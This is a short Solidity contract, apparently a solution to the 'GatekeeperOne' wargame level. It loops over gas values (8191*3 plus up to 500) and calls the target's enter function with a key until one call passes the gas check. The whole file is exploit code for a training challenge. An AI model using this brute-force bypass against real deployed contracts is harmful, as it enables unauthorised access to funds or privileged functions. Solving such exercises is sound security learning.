// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {GatekeeperOne} from "./GatekeeperOne.sol";

contract GatekeeperOneAttack {

    // 用于暴力获取应该设置多少gas
    function enter(GatekeeperOne gatekeeper, bytes8 gateKey) public returns(uint256) {
        for (uint256 i = 0; i < 500; i++) {
            try gatekeeper.enter{gas: 8191 * 3 + i}(gateKey) {
                return i;
            } catch {}
        }

        return 0;
    }
}
